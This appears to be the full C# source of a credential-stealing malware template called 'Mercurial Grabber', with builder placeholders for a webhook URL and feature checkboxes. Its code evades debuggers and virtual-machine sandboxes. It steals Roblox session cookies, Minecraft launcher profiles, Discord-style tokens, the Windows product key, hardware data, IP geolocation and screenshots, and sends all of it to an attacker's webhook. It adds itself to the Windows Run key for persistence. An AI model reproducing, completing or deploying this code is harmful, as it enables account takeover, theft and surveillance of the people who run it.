using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using System.Drawing;
using System.Drawing.Imaging; 
using System.Windows.Forms; 
using System.Net.Http;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace Stealer
{
    class Program
    {

        public static string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static string tempFolder = Environment.GetEnvironmentVariable("TEMP");
        public static Webhook wh = new Webhook("%INSERT_WEBHOOK%");
        
        
        static void Main()
        {
            DetectDebug();
            DetectRegistry();

            %FAKE_ERROR%


            %CHECKBOX8% // Grab IP
            %CHECKBOX11% // Grab Tokens
            %CHECKBOX5% // Product Key
            %CHECKBOX6% // Grab hardware

            %CHECKBOX3% // Cookies
            %CHECKBOX4% // Passwords

            %CHECKBOX2% // Minecraft
            %CHECKBOX1% // Roblox 
            %CHECKBOX7% // Capture Screen
            
            %CHECKBOX10% // Add to startup 

            Console.WriteLine("Task complete");
        }

        static void DetectDebug()
        {
            if (!System.Diagnostics.Debugger.IsAttached)
            {
                return;
            }
            Environment.Exit(0);
        }

        static void DetectRegistry()
        {
            List<string> EvidenceOfSandbox = new List<string>();

            List<string> sandboxStrings = new List<string> { "vmware", "virtualbox", "vbox", "qemu", "xen" };

            string[] HKLM_Keys_To_Check_Exist = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
                @"SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
                @"SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev",
                @"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
                @"SOFTWARE\VMWare, Inc.\VMWare Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                @"HARDWARE\ACPI\DSDT\VBOX_"};

            string[] HKLM_Keys_With_Values_To_Parse = {@"SYSTEM\ControlSet001\Services\Disk\Enum\0",
                @"HARDWARE\Description\System\SystemBiosInformation",
                @"HARDWARE\Description\System\VideoBiosVersion",
                @"HARDWARE\Description\System\SystemManufacturer",
                @"HARDWARE\Description\System\SystemProductName",
                @"HARDWARE\Description\System\Logical Unit Id 0"};

            foreach (string HKLM_Key in HKLM_Keys_To_Check_Exist)
            {
                RegistryKey OpenedKey = Registry.LocalMachine.OpenSubKey(HKLM_Key, false);
                if (OpenedKey != null)
                {
                    EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key);
                }
            }

            foreach (string HKLM_Key in HKLM_Keys_With_Values_To_Parse)
            {
                string valueName = new DirectoryInfo(HKLM_Key).Name;
                string value = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(HKLM_Key), false).GetValue(valueName);
                foreach (string sandboxString in sandboxStrings)
                {
                    if (!string.IsNullOrEmpty(value) && value.ToLower().Contains(sandboxString.ToLower()))
                    {
                        EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key + " => " + value);
                    }
                }
            }

            if (EvidenceOfSandbox.Count == 0)
            {
                return;
            }

            Environment.Exit(0);
        }
  

        public static void Roblox()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com", false))
                {
                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    cookie = cookie.Substring(46).Trim('>');
                    Console.WriteLine(cookie);
                    wh.SendContent(WebhookContent.RobloxCookie(cookie));
                }
            }

            catch (Exception ex)
            {
                wh.SendContent(WebhookContent.SimpleMessage("Roblox Cookie", "Unable to find cookie from Roblox Studio registry"));
                Console.WriteLine(ex.Message);
            }

        }
        public static void StartUp()
        {
            try
            {
                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
                File.Copy(filepath, Path.GetTempPath() + filename);

                string loc = Path.GetTempPath() + filename;

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("Mercurial Grabber", "\"" + loc + "\"");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void Minecraft()
        {
            string target = User.appData + "\\.minecraft\\launcher_profiles.json";
            Console.WriteLine(target);
            Console.WriteLine("copy to : "+ User.tempFolder + "\\launcher_profiles.json");
            if (File.Exists(target)){
                File.Copy(target, User.tempFolder + "\\launcher_profiles.json");
                wh.SendData("Minecraft Session Profiles", "launcher_profiles.json", User.tempFolder + "\\launcher_profiles.json", "multipart/form-data");
            }

            else
            {
                wh.SendContent(WebhookContent.SimpleMessage("Minecraft Session", "Unable to find launcher_profiles.json"));
            }
        }

        static void CaptureScreen()
        {
            Bitmap captureBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;

            Graphics captureGraphics = Graphics.FromImage(captureBitmap);

            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(tempFolder + "\\Capture.jpg", ImageFormat.Jpeg);
            wh.SendData("", "Capture.jpg", tempFolder + "\\Capture.jpg", "multipart/form-data");
        }

        static void GrabToken()
        {
            List<string> tokens = Grabber.Grab();
            foreach (string token in tokens)
            {
                Token t = new Token(token);
                string content = WebhookContent.Token(t.email, t.phoneNumber, token, t.fullUsername, t.avatarUrl, t.locale, t.creationDate, t.userId);
                wh.SendContent(content);
            }
        }

        static void GrabProduct()
        {
            wh.SendContent(WebhookContent.ProductKey(Windows.GetProductKey()));

        }
        static void GrabIP()
        {
            IP varIP = new IP();
            varIP.GetIPGeo();

            wh.SendContent(WebhookContent.IP(varIP.ip, varIP.country, varIP.GetCountryIcon(), varIP.regionName, varIP.city, varIP.zip, varIP.isp));
        }

        static void GrabHardware()
        {
            Machine m = new Machine();
            wh.SendContent(WebhookContent.Hardware(m.osName, m.osArchitecture, m.osVersion, m.processName, m.gpuVideo, m.gpuVersion, m.diskDetails, m.pcMemory));
        }
    }


    class IP
    {
        public string ip = String.Empty;
        public string country = String.Empty;
        public string countryCode = String.Empty;
        public string regionName = String.Empty;
        public string city = String.Empty;
        public string zip = String.Empty;
        public string timezone = String.Empty;
        public string isp = String.Empty;

        public IP ()
        {
            ip = GetIP();
        }

        private string GetIP()
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var response = client.GetAsync("https://ip4.seeip.org");
                    var final = response.Result.Content.ReadAsStringAsync();
                    return final.Result;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
                return String.Empty;
            }
        }
        public void GetIPGeo()
        {
            string resp;
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    var response = client.GetAsync("http://ip-api.com/" + "/json/" + ip);
                    var final = response.Result.Content.ReadAsStringAsync();
                    resp = final.Result;
                    country = Common.Extract("country", resp);
                    countryCode = Common.Extract("countryCode", resp);
                    regionName = Common.Extract("regionName", resp);
                    city = Common.Extract("city", resp);
                    zip = Common.Extract("zip", resp);
                    timezone = Common.Extract("timezone", resp);
                    isp = Common.Extract("isp", resp);
                    Console.WriteLine(resp);
                }
            }

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

        }
        public string GetCountryIcon()
        {
            return "https://www.countryflags.io/"  + countryCode + "/flat/48.png";
        }

    }
}
